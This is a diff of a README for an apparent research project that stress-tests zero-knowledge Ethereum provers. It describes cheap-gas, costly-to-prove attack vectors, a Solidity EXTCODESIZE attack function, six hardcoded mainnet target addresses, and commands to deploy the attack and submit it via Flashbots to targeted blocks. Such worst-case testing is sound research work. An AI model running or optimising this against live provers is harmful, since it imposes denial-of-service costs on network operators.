@@ -28,105 +28,107 @@ This makes them particularly susceptible to targeted worst-case scenarios.
 
 ## Attack Vector Analysis
 
-Here's a ranking of potential attack vectors based on their projected cost efficiency (gas cost vs. ZK prover overhead):
+The current implementation focuses on exploiting the high cost of Keccak hashing in ZK circuits. By forcing the prover to process ~45MiB of contract bytecode through EXTCODESIZE operations, we create a significant computational burden while keeping gas costs reasonable.
 
-### 1. Precompile Exploitation Attack
-- **Why Efficient**: Precompiled contracts like MODEXP, ECRECOVER, and BLAKE2F are extremely expensive for ZK provers, often 100-1000x more costly to prove than their gas cost suggests
-- **Gas Cost**: Very low (fixed gas costs for precompiles)
-- **ZK Overhead**: Extremely high (requires custom circuit implementations)
-- **Implementation**: Craft transactions that call the MODEXP precompiled with carefully selected large exponents and moduli
-- **Example**: 3,000 gas could generate millions of constraints in a ZK circuit
+A particularly promising future direction is exploiting precompiled contracts, especially MODEXP. Precompiles are extremely expensive for ZK provers (often 100-1000x more costly to prove than their gas cost suggests) but have fixed gas costs. For example, a MODEXP operation costing 3,000 gas could generate millions of constraints in a ZK circuit.
 
-### 2. Keccak Collision Search (Original Attack)
-- **Why Efficient**: Keccak is notoriously inefficient in ZK circuits (~20,000 constraints per hash)
-- **Gas Cost**: Moderate (6M gas in your example)
-- **ZK Overhead**: Very high (forces ~45MiB of data through keccak)
-- **Implementation**: EXTCODESIZE across many large contracts
-- **Optimization**: Target contracts that are known to have very large bytecode
+The most effective approach would likely combine multiple vectors - for instance, using EXTCODESIZE on large contracts while also calling MODEXP precompiles with carefully selected large exponents and moduli. This would maximize the "proof stress to gas cost" ratio while staying within reasonable transaction fee limits.
 
-### 3. Witness Size Maximization
-- **Why Efficient**: Some operations produce disproportionately large witnesses
-- **Gas Cost**: Low to moderate
-- **ZK Overhead**: High (forces prover to handle large non-compressible data)
-- **Implementation**: Generate calldata with high entropy that's difficult to compress
-- **Example**: 1MB of carefully crafted calldata might cost under 1M gas but produce 10+MB of proof witness
+### Technical Deep Dive: EXTCODESIZE Attack
 
-### 4. Storage Trie Path Divergence
-- **Why Efficient**: Forces many distinct MPT proofs while updating minimal state
-- **Gas Cost**: Moderate (each SLOAD/SSTORE has a base cost)
-- **ZK Overhead**: High (forces proof system to generate many unique Merkle paths)
-- **Implementation**: Make storage operations to keys that maximize Merkle path differences
-- **Example**: Target accounts with 100+ storage slots at carefully selected keys
+The current attack implementation exploits the high cost of Keccak hashing in ZK circuits by forcing the EVM to load large contract bytecode through EXTCODESIZE operations. Here's how it works:
 
-### 5. Cross-Contract Call Depth Attack
-- **Why Efficient**: Creates complex execution traces with many context switches
-- **Gas Cost**: Moderate (each CALL has overhead)
-- **ZK Overhead**: High (requires proving many contract context changes)
-- **Implementation**: Create a chain of contract calls where each contract makes minimal state changes
-- **Example**: A→B→C→D→E→...→Z where each makes one tiny storage change
+### Attack Mechanism
+1. **Target Selection**: The attack targets 6 large contracts on mainnet, each with significant bytecode size
+2. **Operation**: Uses `EXTCODESIZE` to force the EVM to load the full bytecode of each contract
+3. **ZK Impact**: Each bytecode load requires:
+   - Merkle Patricia trie lookups
+   - Keccak-256 hashing of the bytecode
+   - Complex memory management in ZK circuits
 
-### 6. EVM Memory Expansion
-- **Why Efficient**: Memory expansion is cheap in gas but expensive to prove
-- **Gas Cost**: Low (3 gas per word, plus quadratic after certain thresholds)
-- **ZK Overhead**: Moderate to high
-- **Implementation**: Operations that create large memory allocations without much computation
-- **Example**: Create large arrays in memory without extensive processing of their contents
-
-### 7. Log Generation Overload
-- **Why Efficient**: Events create receipt trie entries that must be proven
-- **Gas Cost**: Moderate to high (LOG operations are not cheap)
-- **ZK Overhead**: Moderate
-- **Implementation**: Contract that emits many events with large data payloads
-- **Optimization**: Use multiple topics to maximize Bloom filter impact
-
-### Cost Efficiency Analysis
-
-To maximize the "proof stress to gas cost" ratio, focus should be on:
-
-1. **Precompile attacks** - By far the most efficient due to fixed gas costs but extremely complex ZK circuits. MODEXP with large inputs is particularly effective.
-2. **Keccak-heavy operations** - The ratio of keccak proof cost to gas cost makes this highly effective, especially when targeting existing large contracts.
-3. **Proof witness expansion** - Operations that produce large witnesses relative to their gas costs.
-
-The most devastating attack would likely combine several of these vectors - for example, using EXTCODESIZE on large contracts while also calling MODEXP precompiles and structuring the attack to maximize memory expansion through carefully crafted array operations.
-
-## Finding Large Contracts
-
-To identify the largest contracts on Ethereum for maximum impact, we used the following BigQuery query against the public Ethereum dataset:
-
-```sql
-SELECT
-  contracts.address,
-  SAFE_DIVIDE(SAFE_SUBTRACT(LENGTH(contracts.bytecode), 2), 2) AS bytecode_length
-FROM
-  `bigquery-public-data.crypto_ethereum.contracts` as contracts
-ORDER BY
-  bytecode_length
-  DESC
+### Implementation Details
+```solidity
+function executeAttack(address[] calldata targets) external {
+    uint256 totalSize = 0;
+    
+    for (uint256 i = 0; i < targets.length; i++) {
+        address target = targets[i];
+        
+        // Force the EVM to load the contract bytecode via EXTCODESIZE
+        uint256 size = target.code.length;
+        totalSize += size;
+        
+        emit ContractAccessed(target, size);
+    }
+    
+    emit AttackSummary(targets.length, totalSize);
+}
 ```
 
-This query:
-1. Accesses all deployed contracts on Ethereum
-2. Calculates their bytecode length (removing the '0x' prefix and accounting for hex encoding)
-3. Orders them by size in descending order
+### Why It's Effective for ZK Stress Testing
+1. **Asymmetric Complexity**: Gas costs are minimal (~408 gas/KB) while ZK circuit complexity is high
+2. **Linear Scaling**: Each contract adds its full bytecode size to the proof complexity
+3. **Memory Intensive**: Forces ZK circuits to handle large memory operations
+4. **No Circuit Optimizations**: Keccak hashing is inherently expensive to prove
+
+### Performance Metrics
+- Total bytecode loaded: ~45MiB across 6 contracts
+- Gas consumption: ~39,000 gas (normal attack)
+- Gas per KB: ~408 gas/KB
+- Additional overhead with EXTCODECOPY: ~25,700 gas
+
+### Target Contracts
+The attack targets carefully selected large contracts on mainnet:
+```solidity
+address[] memory targets = new address[](6);
+targets[0] = 0x1908D2bD020Ba25012eb41CF2e0eAd7abA1c48BC;
+targets[1] = 0xa102b6Eb23670B07110C8d316f4024a2370Be5dF;
+targets[2] = 0x84ab2d6789aE78854FbdbE60A9873605f4Fd038c;
+targets[3] = 0xfd96A06c832f5F2C0ddf4ba4292988Dc6864f3C5;
+targets[4] = 0xE233472882bf7bA6fd5E24624De7670013a079C1;
+targets[5] = 0xd3A3d92dbB569b6cd091c12fAc1cDfAEB8229582;
+```
+
+### Future Improvements
+1. **Contract Selection**: Expand target list to include more large contracts
+2. **Operation Mixing**: Combine with other expensive ZK operations
+3. **Timing Optimization**: Target specific blocks for maximum impact
+4. **Gas Efficiency**: Further optimize gas usage while maintaining ZK complexity
 
 ## Project Structure
 
 ```
 zkarnage/
-├── src/
-│   ├── WorstCaseAttack.sol    # The main attack contract
-│   └── AddressList.sol        # Library containing target addresses
-├── script/
-│   ├── DeployAttack.s.sol     # Script to deploy the attack contract
-│   ├── ExecuteAttack.s.sol    # Script to execute the attack
-│   ├── CheckSizes.s.sol       # Script to verify bytecode sizes
+├── src/                    # Source code
+│   ├── WorstCaseAttack.sol    # Main attack contract implementation
+│   └── AddressList.sol        # Library containing target contract addresses
+├── script/                 # Deployment and execution scripts
+│   ├── DeployAttack.s.sol     # Deploy the attack contract
+│   ├── ExecuteAttack.s.sol    # Execute the attack with target addresses
+│   ├── CheckSizes.s.sol       # Verify bytecode sizes of target contracts
 │   ├── DeployAndAttack.s.sol  # Combined deploy & attack script
-│   ├── FindLargeContracts.s.sol  # Script to find large contracts on mainnet
-│   └── TargetSpecificBlock.s.sol # Script to target blocks divisible by 100
-├── test/
-│   └── WorstCaseAttack.t.sol  # Tests for the attack contract
-└── README.md                  # This file
+│   ├── FlashbotsSubmit.s.sol  # Prepare transaction data for Flashbots
+│   └── submit_bundle.py       # Python script for Flashbots bundle submission
+├── test/                  # Test files
+│   └── WorstCaseAttack.t.sol  # Tests for attack contract functionality
+├── out/                   # Output files
+│   └── flashbots_data.json    # Flashbots transaction data
+├── broadcast/             # Deployment transaction data
+├── lib/                   # Dependencies
+│   └── forge-std/            # Foundry standard library
+├── .env.example          # Example environment variables
+├── foundry.toml          # Foundry configuration
+├── requirements.txt      # Python dependencies
+└── README.md            # This file
 ```
+
+### Key Components
+
+- **Attack Contract**: Implements the EXTCODESIZE-based attack vector
+- **Address Library**: Maintains list of target contracts with large bytecode
+- **Deployment Scripts**: Handle contract deployment and attack execution
+- **Flashbots Integration**: Ensures transaction inclusion in target blocks
+- **Test Suite**: Validates attack effectiveness and gas consumption
 
 ## Setup
 
@@ -145,23 +147,19 @@ zkarnage/
 3. Install dependencies:
    ```bash
    forge install
+   pip install -r requirements.txt
+   ```
+
+4. Set up your environment:
+   ```bash
+   cp .env.example .env
+   # Edit .env with your values:
+   # - ETH_RPC_URL: Your Ethereum node URL
+   # - PRIVATE_KEY: Your private key (without 0x prefix)
+   # - FLASHBOTS_RELAY_URL: Optional custom Flashbots relay URL
    ```
 
 ## Usage
-
-### Find Large Contracts
-
-Before running the attack, you may want to identify large contracts on mainnet:
-
-```bash
-# Set your Ethereum RPC URL
-export ETH_RPC_URL="https://eth-mainnet.alchemyapi.io/v2/YOUR_API_KEY"
-
-# Run the script to find large contracts
-forge script script/FindLargeContracts.s.sol --rpc-url $ETH_RPC_URL
-```
-
-This will generate a file called `large_contracts.txt` with addresses of large contracts sorted by size.
 
 ### Check Contract Sizes
 
@@ -171,53 +169,38 @@ To verify the size of the target contracts:
 forge script script/CheckSizes.s.sol --rpc-url $ETH_RPC_URL
 ```
 
-### Deploy the Attack Contract
+### Submit Attack Bundle to Flashbots
 
-To deploy the attack contract:
+To submit the attack bundle to Flashbots:
 
+1. First, generate the transaction data:
 ```bash
-# Set your private key (use a burner wallet!)
-export PRIVATE_KEY=0x...
-
-# Deploy the contract
-forge script script/DeployAttack.s.sol --rpc-url $ETH_RPC_URL --broadcast
+forge script script/FlashbotsSubmit.s.sol --rpc-url $ETH_RPC_URL
 ```
 
-Take note of the deployed contract address for future steps.
-
-### Execute the Attack
-
-To execute the attack with a previously deployed contract:
-
+2. Then submit the bundle to Flashbots:
 ```bash
-# Set the deployed contract address
-export ATTACK_CONTRACT=0x...
-
-# Execute the attack
-forge script script/ExecuteAttack.s.sol --rpc-url $ETH_RPC_URL --broadcast
+python3 script/submit_bundle.py
 ```
 
-### Deploy and Execute in One Step
+The Python script will:
+- Read the transaction data from the Foundry output
+- Sign and package the transaction into a Flashbots bundle
+- Submit the bundle to the Flashbots relay
+- Wait for and report bundle inclusion status
 
-For convenience, you can deploy and execute the attack in one step:
+You can target a specific block by setting the `TARGET_BLOCK` environment variable:
+```bash
+TARGET_BLOCK=1234567 forge script script/FlashbotsSubmit.s.sol --rpc-url $ETH_RPC_URL
+```
+
+### Deploy and Execute Normally (Non-Flashbots)
+
+For testing or if you don't need Flashbots, you can deploy and execute the attack directly:
 
 ```bash
 forge script script/DeployAndAttack.s.sol --rpc-url $ETH_RPC_URL --broadcast
 ```
-
-### Target Specific Blocks
-
-To target blocks where the block number is divisible by 100:
-
-```bash
-# Set the deployed contract address
-export ATTACK_CONTRACT=0x...
-
-# Run the targeting script
-forge script script/TargetSpecificBlock.s.sol --rpc-url $ETH_RPC_URL --broadcast
-```
-
-This script will calculate the next block divisible by 100 and wait for it to be close before executing the attack.
 
 ## Testing
 
@@ -278,3 +261,17 @@ By conducting this research in a transparent manner, we aim to strengthen the Et
 ## License
 
 This project is licensed under MIT.
+
+## Citation
+
+If you use this work in your research, please cite it as:
+
+```bibtex
+@software{zkarnage2024,
+  author = {Swann, Conner},
+  title = {ZKarnage: Stress Testing ZK Systems Through Maximum Pain},
+  year = {2024},
+  publisher = {GitHub},
+  url = {https://github.com/yourbuddyconner/zkarnage}
+}
+```
